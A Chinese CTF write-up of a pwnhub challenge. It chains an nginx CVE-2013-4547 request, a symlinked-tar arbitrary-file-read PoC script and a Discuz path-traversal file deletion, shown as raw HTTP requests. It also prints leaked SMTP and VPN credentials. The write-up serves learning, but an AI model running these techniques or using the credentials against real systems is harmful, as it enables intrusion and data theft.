作者：[Hcamael@知道创宇404实验室](http://0x48.pw)  
发布时间：2017-10-04

#### Step 0

首先是`.DS_Store`信息泄露，下载下来是一个二进制文件，需要解析，google搜一搜就有了：

    
    
    >>> from ds_store import DSStore
    
    >>> with DSStore.open("DS_Store", "r+") as f:
    ...     for i in f:
    ...         print i
    <admin Iloc>
    <admin bwsp>
    <admin vSrn>
    <config Iloc>
    <config bwsp>
    <config vSrn>
    <includes Iloc>
    <includes bwsp>
    <includes vSrn>
    <index.html Iloc>
    <index.php Iloc>
    <index.php ptbL>
    <index.php ptbN>
    <pwnhub Iloc>
    <pwnhub bwsp>
    <pwnhub vSrn>
    <upload  Iloc>
    <upload  bwsp>
    <upload  vSrn>

#### Step 1

根据提示：`2017.10.02 15:45:49Nginx 虽然有过很多问题，但是它是个好 server`

猜测应该是利用一个NGINX的CVE

然后在上一步发现一个奇怪的地方，最后一个是`uploap[space]` 目录而不是`uploap`目录，有一个空格。

根据这些信息，搜到一个CVE，编号是[CVE-2013-4547](https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547)

....题目关了，搞不到图了。

payload是：`GET upload /../pwnhub/ HTTP/1.1`

这里不能使用浏览器，因为浏览器会把这url变成`/pwnhub/`

得到一个路径：`6c58c8751bca32b9943b34d0ff29bc16/index.php`

#### Step 2

`6c58c8751bca32b9943b34d0ff29bc16/index.php`是一个文件上传的服务

    
    
    <!DOCTYPE html>
    <html>
    <head>
        <title>你在里面发现了什么? </title>
    </head>
    <body>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
    <input name="upload" type="file" /><br/>
    <input type="submit" value="上传" />
    <p>注意：只支持tar!!</p>
    <p>更新配置成功，内容如下</p><textarea cols="30" rows="15"></textarea></form>
    </body>
    </html>

一开始尝试上传各种文件，都能成功，但是配置更新成功并没有显示任何内容，包括上传tar文件，懵逼了一会。。。

然后发现，这个目录也有`.DS_Store`泄露：

    
    
    >>> with DSStore.open("DS_Store", "r+") as f:
    ...     for i in f:
    ...         print "|%s|"%i.filename
    |index.php|
    |untar.py|

有一个untar.py文件：

    
    
    import tarfile
    import sys
    import uuid
    import os
    
    
    def untar(filename):
        os.chdir('/tmp/pwnhub/')
        t = tarfile.open(filename, 'r')
        for i in t.getnames():
            if '..' in i or '.cfg' != os.path.splitext(i)[1]:
                return 'error'
            else:
                try:
                    t.extract(i, '/tmp/pwnhub/')
                except Exception, e:
                    return e
                else:
                    cfgName = str(uuid.uuid1()) + '.cfg'
                    os.rename(i, cfgName)
                    return cfgName
    
    if __name__ == '__main__':
        filename = sys.argv[1]
        if not tarfile.is_tarfile(filename):
            exit('error')
        else:
            print untar(filename)

很明显了，要压缩一个cfg文件

    
    
    $ echo "fjwopqafjasdo" > /tmp/test.cfg
    $ tar cf /tmp/test.tar /tmp/test.cfg

然后上传test.tar，更新配置成功后终于成功返回内容了。

但是该怎么利用又卡住了，然后看到hint：`2017.10.03 11:24:40想办法把它变成任意文件读取，但 Flag 不在这儿
，当作一次真实渗透玩吧！`

想到了软链接，PoC如下：

    
    
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    import os
    import sys
    import re
    import requests
    from bs4 import BeautifulSoup
    
    def upload():
        url = "http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/index.php"
        files = {"upload": ("test.tar", open("/tmp/test.tar", "rb"), "application/x-tar")}
        r = requests.post(url, files=files)
        data = r.content
        # html = BeautifulSoup(data, "lxml")
        # print html.textarea.contents[0]
        print data
    
    def main():
        filename = sys.argv[1]
        print filename
        os.system("ln -sf %s /tmp/test.cfg"%filename)
        os.system("tar cf /tmp/test.tar /tmp/test.cfg")
        upload()
    
    
    if __name__ == '__main__':
        main()

#### Step 3

到了任意文件读取的步骤了，然后各种文件读读，照例我都会读读`/proc/self`下的文件，然后发现：

    
    
    $ python 2013_read_file.py /proc/self/mountinfo
    
    <!DOCTYPE html>
    <html>
    <head>
        <title>你在里面发现了什么? </title>
    </head>
    <body>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
    <input name="upload" type="file" /><br/>
    <input type="submit" value="上传" />
    <p>注意：只支持tar!!</p>
    <p>更新配置成功，内容如下</p><textarea cols="30" rows="15">181 103 0:40 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay/a67f9242dc6db4569b299d14ce4308f2f63624e8387569cbe015cbc973e50a0c/root,upperdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/upper,workdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/work
    182 181 0:43 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
    238 181 0:44 / /dev rw,nosuid - tmpfs tmpfs rw,mode=755
    239 238 0:45 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
    240 181 0:46 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
    241 240 0:47 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755
    242 241 0:22 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/systemd ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd
    243 241 0:24 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,blkio
    244 241 0:25 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/perf_event ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,perf_event
    245 241 0:26 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpu,cpuacct
    246 241 0:27 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,pids
    247 241 0:28 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/freezer ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,freezer
    248 241 0:29 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/net_cls,net_prio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,net_cls,net_prio
    249 241 0:30 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/memory ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,memory
    250 241 0:31 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpuset
    251 241 0:32 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,hugetlb
    252 241 0:33 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/devices ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,devices
    253 238 0:42 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
    254 181 202:1 /home/ubuntu/Nginx_1.4.2/crontab /etc/crontab rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    255 181 202:1 /home/ubuntu/Nginx_1.4.2/pwnhub /tmp/pwnhub rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    256 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    257 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/hostname /etc/hostname rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    258 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/hosts /etc/hosts rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    259 238 0:41 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k
    260 181 202:1 /home/ubuntu/Nginx_1.4.2/html /usr/local/nginx/html rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    261 238 202:1 /home/ubuntu/Nginx_1.4.2/access.log /dev/stdout rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    262 181 202:1 /home/ubuntu/Nginx_1.4.2/run /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    263 181 202:1 /home/ubuntu/Nginx_1.4.2/nginx.conf /usr/local/nginx/conf/nginx.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    264 181 202:1 /home/ubuntu/Nginx_1.4.2/cron_run.sh /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    419 181 202:1 /home/ubuntu/Nginx_1.4.2/www.conf /etc/php5/fpm/pool.d/www.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    104 238 0:45 /0 /dev/console rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
    107 182 0:43 /bus /proc/bus ro,relatime - proc proc rw
    108 182 0:43 /fs /proc/fs ro,relatime - proc proc rw
    109 182 0:43 /irq /proc/irq ro,relatime - proc proc rw
    110 182 0:43 /sys /proc/sys ro,relatime - proc proc rw
    111 182 0:43 /sysrq-trigger /proc/sysrq-trigger ro,relatime - proc proc rw
    112 182 0:44 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,mode=755
    113 182 0:44 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,mode=755
    114 182 0:44 /null /proc/timer_stats rw,nosuid - tmpfs tmpfs rw,mode=755
    115 182 0:44 /null /proc/sched_debug rw,nosuid - tmpfs tmpfs rw,mode=755
    132 240 0:48 / /sys/firmware ro,relatime - tmpfs tmpfs ro
    </textarea></form>
    </body>
    </html>

发现一个脚本：`/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh`

    
    
    $ python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh
    /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh
    tar: Removing leading `/' from member names
    <!DOCTYPE html>
    <html>
    <head>
        <title>你在里面发现了什么? </title>
    </head>
    <body>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
    <input name="upload" type="file" /><br/>
    <input type="submit" value="上传" />
    <p>注意：只支持tar!!</p>
    <p>更新配置成功，内容如下</p><textarea cols="30" rows="15">#\!/bin/bash
    
    cd /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/ && python run.py
    </textarea></form>
    </body>
    </html>
    
    $ python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py 
    /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py
    tar: Removing leading `/' from member names
    <!DOCTYPE html>
    <html>
    <head>
        <title>你在里面发现了什么? </title>
    </head>
    <body>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
    <input name="upload" type="file" /><br/>
    <input type="submit" value="上传" />
    <p>注意：只支持tar!!</p>
    <p>更新配置成功，内容如下</p><textarea cols="30" rows="15">#encoding=utf8
    
    from collections import Counter
    from mail_send import send_mail
    
    ip = []
    statusCode = []
    
    def toDeal(filename):
        with open(filename, 'r') as f:
            logs = f.readlines()
            for log in logs:
                ip.append(log.split()[0])
                statusCode.append(log.split()[8])
    
        logAll = '日志总数：' + str(len(logs))
        ipUV = '独立 IP：' + str(list(set(ip)))
        ipNumber = 'IP出现次数：' + str(dict(Counter(ip)))
        codeNumber = '状态码出现次数：' + str(dict(Counter(statusCode)))
        content = logAll + '\n' + ipUV + '\n' + ipNumber + '\n' + codeNumber
        send_mail('Pwnhub Nginx Report', content)
    
    if __name__ == '__main__':
        toDeal('/usr/local/var/log/nginx/access.log')
    </textarea></form>
    </body>
    </html>
    
    $ python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py
    /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py
    tar: Removing leading `/' from member names
    <!DOCTYPE html>
    <html>
    <head>
        <title>你在里面发现了什么? </title>
    </head>
    <body>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
    <input name="upload" type="file" /><br/>
    <input type="submit" value="上传" />
    <p>注意：只支持tar!!</p>
    <p>更新配置成功，内容如下</p><textarea cols="30" rows="15">#coding:utf-8
    
    import smtplib
    from email.mime.text import MIMEText
    
    mail_user = 'ctf_dicha@21cn.com'
    mail_pass = '634DRaC62ehWK6X'
    mail_server = 'smtp.21cn.com'
    mail_port = 465
    to_user = 'wyd0n9@gmail.com'
    
    def send_mail(title,content):
        #创建一个实例，这里设置为html格式邮件
        msg = MIMEText(content, _subtype = 'html', _charset = 'utf-8')
        msg['Subject'] = title
        msg['From'] = mail_user
        msg['To'] = to_user
        try:
            #登录smtp服务器
            server = smtplib.SMTP_SSL(mail_server,mail_port)
            server.login(mail_user,mail_pass)
            #邮件发送
            server.sendmail(mail_user,to_user,msg.as_string())
            server.quit()
            return True
        except Exception as e:
            print(str(e))
            return False
    
    
    </textarea></form>
    </body>
    </html>

#### Step 4

得到一个邮箱，然后尝试去登录看看，然后在收件箱看到一个发送vpn邮箱发送失败的返回邮件，然后去发件箱得到一个vpn:

    
    
    IPsec VPN server is now ready for use!
    
    
    Connect to your new VPN with these details:
    
    
    Server IP: 54.223.177.152
    IPsec PSK: dkQ97gGQPuVm833Ed2F9
    Username: pwnhub
    Password: LE3U2aTgc4DGZd92wg82
    
    
    Write these down. You'll need them to connect!

这里想找个linux图形界面连IPsec的软件，但没找到，还是切换到Mac了。。

VPN连上后应该就是内网找服务了，因为nmap探测的很慢，所以只探测80端口

咸鱼了一会后发现几台主机：

    
    
    172.17.0.1
    172.17.0.3
    172.17.0.5
    172.17.0.7
    172.17.0.9

从这可以看出来这是一个docker，其中1是外网那个服务的容器，其他80端口都是nginx默认端口，然后扫描3发现还开了8090，根据之后的提示：`搞
Discuz 不是目的，谁说鸡肋就没用，看 Discuz 送助攻`

#### Step 5

8090端口开的就是一个dz x3.2服务，然后就知道是搞这个了，找了下dz的漏洞去尝试，发现只有ssrf，有最新的任意文件删除的是有效的。

然后发现自己太菜了，根本不会做web，日不动dz。。。。。。

然后偶然间发现。。。。80端口变了，竟然不是默认的nginx服务了, 是一个跳转到`index.php`的html页面，`index.php`页面如下：

    
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>get flag?</title>
    </head>
    
    
    <!-- include 'safe.php';
    
    
    if($_REQUEST['passwd'] === 'jiajiajiajiajia'){
        echo "$flag";
    } -->
    
    </body>
    </html>
    
    Oh,Hacked ?

尝试访问：`http://172.17.0.3/index.php?passwd=jiajiajiajiajia`当然是失败的，因为有个`safe.php`

然后根据前面dz获取到的信息，猜测safe.php是ip过滤，然后我得到一个思路(当然是错误的思路):
利用dz的ssrf访问`http://127.0.0.1/index.php?passwd=jiajiajiajiajia`,
因为dz的ssrf是一个远程图片下载的，所以会把请求到的信息下载下来保存到本地，然后`/data`目录是可遍历的，文件会下载到`data/attachment/profile/201710/0x`目录下。

但是目录遍历到201710就没法遍历了，发现是有一个index.html，然后有了一个思路，是利用任意文件删除漏洞把index.html删除，成功了，可以看到`data/attachment/profile/201710/04/`目录下的文件了，然后尝试ssrf，但是是失败的，源码审计看了一会，原来dz把ssrf请求下来的保存成文件后会获取图片信息，如果获取失败会删除。

想了想竞争，但是从保存文件到删除文件，间隔时间太短了，竞争不靠谱。。。又陷入僵局

然后出题人半夜改题了，一个开始80是nginx服务，dz是apache服务。然后换成了80是apache，dz是nginx。

然后我之前的思路就完成GG了，因为无法获取到下载下来的文件名。

然后就只剩一个思路了，利用dz的任意文件删除漏洞，删除safe.php

最开始我也想过这个，但是这个思路的问题太多了，一个是两个不同服务，凭啥有权限删除，safe.php又不是在upload这种会777的目录下，第二就是，一个人做出来了其他人不也做出来了

半夜2点多的时候尝试删除safe.php，失败，睡觉，早上9点多起来发现已经3血了，再次尝试，成功。。。。。。。。。。。。。。。。。。

没有写PoC，手工做题，首先python先跑起来：

    
    
    >>> while True:
    ...     r = requests.get(url3)
    ...     print r.content
    ...     if r.status_code == 404:
    ...         print "right"
    ...         r = requests.get(url2)
    ...         print r.content
    ...     time.sleep(1)
    Oh,Hacked ?

然后使用burp，首先是请求：

    
    
    POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
    Host: 172.17.0.3:8090
    Content-Length: 2244
    Cache-Control: max-age=0
    Origin: http://172.17.0.3:8090
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHL816KVx2cHVmZcq
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://172.17.0.3:8090/home.php?mod=spacecp&ac=profile&op=base
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4
    Cookie: 3LFi_2132_saltkey=iAo9aN8L; 3LFi_2132_lastvisit=1507028276; 3LFi_2132_sendmail=1; 3LFi_2132_home_readfeed=1507037399; 3LFi_2132_seccode=19.90700de229cc94ae7e; 3LFi_2132_ulastactivity=5e6dmN2yw6RW9gYAeu0%2BFQj4zPpXufkmFS79DZbibxsS1GKyf30i; 3LFi_2132_auth=e93etvAAYQo0lvRVwL9syLfiWnGnZj7HnZAZRfhXA84VUXaWbScrKrKqleMUclzMt%2FB67ybK%2FTtRoNhg%2FF7V; 3LFi_2132_lastcheckfeed=3%7C1507037417; 3LFi_2132_lip=172.17.0.2%2C1507030640; 3LFi_2132_nofavfid=1; 3LFi_2132_onlineusernum=1; 3LFi_2132_checkpm=1; 3LFi_2132_sid=QGWdpE; 3LFi_2132_lastact=1507037551%09misc.php%09patch
    Connection: close
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="formhash"
    
    89dbe522
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="realname"
    
    aklis
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[realname]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="gender"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[gender]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="birthyear"
    
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="birthmonth"
    
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="birthday"
    
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[birthday]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="birthprovince"
    
    ../../../../../../../../../usr/share/nginx/html/safe.php
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[birthcity]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="resideprovince"
    
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[residecity]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="affectivestatus"
    
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[affectivestatus]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="lookingfor"
    
    
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[lookingfor]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="bloodtype"
    
    A
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="privacy[bloodtype]"
    
    0
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="profilesubmit"
    
    true
    ------WebKitFormBoundaryHL816KVx2cHVmZcq
    Content-Disposition: form-data; name="profilesubmitbtn"
    
    true
    ------WebKitFormBoundaryHL816KVx2cHVmZcq--
然后再请求:

    
    
    POST /home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaa HTTP/1.1
    Host: 172.17.0.3:8090
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.18.1
    Content-Length: 543
    Cookie: 3LFi_2132_saltkey=iAo9aN8L; 3LFi_2132_lastvisit=1507028276; 3LFi_2132_home_readfeed=1507037399; 3LFi_2132_ulastactivity=5e6dmN2yw6RW9gYAeu0%2BFQj4zPpXufkmFS79DZbibxsS1GKyf30i; 3LFi_2132_auth=e93etvAAYQo0lvRVwL9syLfiWnGnZj7HnZAZRfhXA84VUXaWbScrKrKqleMUclzMt%2FB67ybK%2FTtRoNhg%2FF7V; 3LFi_2132_lastcheckfeed=3%7C1507037417; 3LFi_2132_nofavfid=1; 3LFi_2132_visitedfid=2; 3LFi_2132_forum_lastvisit=D_2_1507041771; 3LFi_2132_st_p=3%7C1507041805%7C587c0547c79d9aad1865192204c3e348; 3LFi_2132_viewid=tid_1; 3LFi_2132_lip=172.17.0.2%2C1507041386; 3LFi_2132_st_t=3%7C1507042459%7Cec88a27fedbb1c6205e196d933f91e42; 3LFi_2132_editormode_e=1; 3LFi_2132_seccode=47.a0f88955fd6a0cfce9; 3LFi_2132_smile=1D1; 3LFi_2132_onlineusernum=9; 3LFi_2132_checkpm=1; 3LFi_2132_sendmail=1; 3LFi_2132_home_diymode=1; 3LFi_2132_sid=A92w24; 3LFi_2132_lastact=1507046589%09home.php%09misc
    Content-Type: multipart/form-data; boundary=2b4ed56c9a8d4dff838f4fba3c258b9b
    
    --2b4ed56c9a8d4dff838f4fba3c258b9b
    Content-Disposition: form-data; name="profilesubmit"
    
    1
    --2b4ed56c9a8d4dff838f4fba3c258b9b
    Content-Disposition: form-data; name="formhash"
    
    89dbe522
    --2b4ed56c9a8d4dff838f4fba3c258b9b
    Content-Disposition: form-data; name="birthprovince"; filename="a.png"
    Content-Type: image/png
    
    PS: 正常的图片，因为有不可显字符，就不复制上来了，懒得截图....
    --2b4ed56c9a8d4dff838f4fba3c258b9b--
然后成功getflag：

    
    
    File not found.
    
    right
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>get flag?</title>
    </head>
    
    
    <!-- include 'safe.php';
    
    
    if($_REQUEST['passwd'] === 'jiajiajiajiajia'){
        echo "$flag";
    } -->
    
    </body>
    </html>
    
    pwnhub{flag:800eaf3244994b224c30e5f24b59f178}

PS: 这题我给的评分是4，我觉得最后一步是本题的败笔，首先环境的问题就不说了。主要是这个思路，只是为出题而设置的，没啥其他意义。。。。前面的思路都挺好的。

本文就附一张图：

![wohaocaia.jpg](http://qn.lazysheep.cc/img/cai.jpg)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/442/>

